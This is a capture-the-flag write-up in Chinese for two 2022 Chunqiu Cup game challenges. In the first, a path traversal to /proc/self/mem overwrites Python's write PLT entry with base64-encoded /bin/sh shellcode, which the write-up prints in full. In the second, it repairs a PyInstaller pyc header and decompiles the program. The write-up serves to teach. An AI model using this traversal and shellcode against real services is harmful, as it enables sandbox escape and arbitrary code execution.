---
title: 春秋杯冬季赛游戏类misc题解析：《楠之勇者传》、《驯鹿游戏》
contest: 春秋杯冬季赛
year: 2022
difficulty: medium
vuln_type: misc_unknown
tags: [文字游戏, Python沙箱, /proc/self/mem, plt注入, PyInstaller反编译, base64魔法, 春秋GAME]
attack_chain: 楠之勇者传：买基础魔杖触发base64编码写入→目录穿越../../../../../../../proc/self/mem+seek偏移→向python3.6 write PLT写shellcode→/bin/sh→驯鹿游戏：PyInstaller Extractor+补pyc头550d0d0a+uncompyle6反编译→getczekolada()返回gzip解压flag
key_payload: "../../../../proc/self/mem;elf.plt['write']=4327552;shellcraft.sh() base64;b64encode(asm(shellcraft.sh()))=amhIuC9iaW4vLy9zUEiJ52hyaQEBgTQkAQEBATH2VmoIXkgB5lZIieYx0mo7WA8F;550d0d0a 00000000 00000000 pyc头"
one_liner: 春秋杯冬两游戏题：楠之勇者传/proc/self/mem写PLT注入shellcode+驯鹿游戏PyInstaller补pyc头反编译
lesson: /proc/self/mem可绕过沙箱向python plt写shellcode（PIE关闭时基址固定）；PyInstaller补pyc头550d0d0a即可uncompyle6
quality: high
---

# 春秋杯冬季赛游戏类misc题解析：《楠之勇者传》、《驯鹿游戏》

**赛事**：春秋杯冬季赛（春秋GAME伽玛实验室）

**两题详解**：

**1. 楠之勇者传（文字游戏 + Python沙箱逃逸）**
- 文字冒险游戏，nc连接，操作有限
- 选择1：新手村（信息收集，装备介绍，神秘之戒记录ubuntu 18.04 + python 3.6.9）
- 选择3：魔法师公会购买基础魔杖（"基础64"魔法 = base64编码）
- 选择2：勇者峡谷记事录（输入文件名、页数、内容，启用base64编码写入）
- 选择4：历练岛（随机金币/血量）
- 选择5：提示大厅（提示flag在/flag）
- 关键观察：基础魔杖触发base64编码写入，页数=文件seek偏移
- **/proc/self/mem利用**：
  - 文件名 `../../../../proc/self/mem`
  - python3.6无PIE，基址固定 0x400000
  - pwntools查 `elf.plt['write'] = 4327552`
  - shellcode：`b64encode(asm(shellcraft.sh()))` = `amhIuC9iaW4vLy9zUEiJ52hyaQEBgTQkAQEBATH2VmoIXkgB5lZIieYx0mo7WA8F`
  - 文件名 = base64(shellcode) + 页数 = plt地址
  - 写入后任意write调用 → /bin/sh → cat /flag

**2. 驯鹿游戏（PyInstaller反编译）**
- PyInstaller打包exe
- `pyinstxtractor.py reindeer.exe` 提取
- PYZ-00.pyz_extracted文件夹 → pyc头为 `550d0d0a 00000000 00000000`（python 3.8）
- reindeer文件补该头 → reindeer.pyc
- `uncompyle6 reindeer.pyc` 反编译
- 找到 `from astar import astar, getczekolada`
- `getczekolada()` 返回gzip解压的flag

**技术要点**：
- /proc/self/mem可绕过Python沙箱
- seek + 文件名注入 = 任意地址写
- shellcraft.sh() 直接生成sh shellcode
- PyInstaller pyc头修复 `550d0d0a 00000000 00000000`

**质量评估**：高（命令payload完整 + 原理清晰）
